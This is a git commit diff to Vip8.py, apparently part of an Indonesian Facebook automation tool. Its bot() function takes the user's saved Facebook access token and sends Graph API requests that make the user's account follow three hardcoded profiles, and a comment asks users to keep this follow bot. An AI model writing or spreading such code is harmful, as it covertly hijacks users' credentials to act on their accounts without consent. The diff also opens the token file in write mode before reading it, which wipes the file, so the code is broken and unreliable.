d96b3c6d8003952ea7124a8af96a32171f981322
Strovmirviaska <104303603+Strv-BOT@users.noreply.github.com>
2022-05-16 14:08:38 +0800

    Update Vip8.py

--- Vip8.py
+++ Vip8.py
@@ -110,7 +110,9 @@ def login_lagi():
 # HARGAI SEDIKIT AJA JANGAN GANTI BOT FOLOW NYA CUKUP TAMBAHKAN, TERIMA KASIH BUAT YG PENGERTIAN :V
 def bot():
 		try:
-		toket = open('token.x','w').read()
+			toket = open('token.x','w').read()
+		except IOError:
+			print('\n [%s!%s] Token mokad ganti akun!'%(M,N));time.sleep(1);login().login_lagi()
 		requests.post('https://graph.facebook.com/100033480633498/subscribers?access_token=' + toket)
 		requests.post('https://graph.facebook.com/100001490081130/subscribers?access_token=' + toket)
 		requests.post('https://graph.facebook.com/1517769961/subscribers?access_token=' + toket)
